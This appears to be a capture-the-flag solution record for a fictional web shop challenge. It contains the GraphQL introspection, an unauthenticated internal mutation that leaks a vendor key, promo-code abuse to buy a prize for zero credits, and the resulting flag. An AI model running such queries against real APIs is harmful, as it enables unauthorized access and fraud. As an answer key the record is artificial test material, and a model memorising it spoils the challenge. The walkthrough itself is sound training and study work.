challenge.name: Used Goods of Tomorrow
challenge.description: Come to Tommorow-Mart for all your used goods! We even have a partnership with FutureBank to grant you 500 free credits to start!

records.findings_summary: Flag found via GraphQL API abuse: enabled internal mutation leaks vendor master key -> query promo table -> 100% off promo to buy the $1,000,000 prize lot for 0 credits: sun{1_l0v3_fr33_stuff} | Evidence: GraphQL endpoint /graphql with introspection exposes an internal mutation vendorTerminalSync (description: 'INTERNAL / MAINTENANCE ... Left enabled from the closed beta'). ; Calling `mutation{vendorTerminalSync{terminalId status firmware vendorKey note}}` without any auth returned vendorKey=VND-MASTER-21d5f80206dffb6fa9ad5722. ; Query `{promoCodes(vendorKey:"VND-MASTER-21d5f80206dffb6fa9ad5722"){code description percentOff appliesTo}}` returned the discount table including FOUNDERS-100: '100% off Lot #4042. Internal use only.' (appliesTo=4042). ; Listing 4042 'Founders' Vault Deed (SEALED)' costs priceCredits=1,000,000 while new accounts only get 500 credits. ; Calling `mutation($id:ID!,$promo:String){placeOrder(listingId:$id,promoCode:$promo){success message listingId pricePaid flag}}` with id=4042, promoCode=FOUNDERS-100 returned success=true, pricePaid=0 and flag=sun{1_l0v3_fr33_stuff}.
solution_steps: 枚举 GraphQL：POST /graphql 使用内省查询 {__schema{...}}，发现隐藏的内部变更 vendorTerminalSync(terminalId: ID) 会返回 VendorDiagnostics（含 vendorKey）。
无需鉴权调用 mutation{vendorTerminalSync{terminalId status firmware vendorKey note}}，泄露 vendorKey=VND-MASTER-21d5f80206dffb6fa9ad5722。
用泄露的 vendorKey 调用 promoCodes(vendorKey:...)，得到促销表，其中 FOUNDERS-100 = 对 Lot #4042 打 100% 折扣（内部使用）。
注册账号（500 初始信用点）后对 listingId=4042 调用 placeOrder(listingId:"4042", promoCode:"FOUNDERS-100")，价格变为 0，成功购买到价值 1,000,000 的保险箱地契。
Receipt 的 flag 字段返回 sun{1_l0v3_fr33_stuff}。
evidence: GraphQL endpoint /graphql with introspection exposes an internal mutation vendorTerminalSync (description: 'INTERNAL / MAINTENANCE ... Left enabled from the closed beta').
Calling `mutation{vendorTerminalSync{terminalId status firmware vendorKey note}}` without any auth returned vendorKey=VND-MASTER-21d5f80206dffb6fa9ad5722.

Query `{promoCodes(vendorKey:"VND-MASTER-21d5f80206dffb6fa9ad5722"){code description percentOff appliesTo}}` returned the discount table including FOUNDERS-100: '100% off Lot #4042. Internal use only.' (appliesTo=4042).
Listing 4042 'Founders' Vault Deed (SEALED)' costs priceCredits=1,000,000 while new accounts only get 500 credits.

Calling `mutation($id:ID!,$promo:String){placeOrder(listingId:$id,promoCode:$promo){success message listingId pricePaid flag}}` with id=4042, promoCode=FOUNDERS-100 returned success=true, pricePaid=0 and flag=sun{1_l0v3_fr33_stuff}.
Platform submission page showed alert 'Correct' and confirm_submission returned CORRECT.
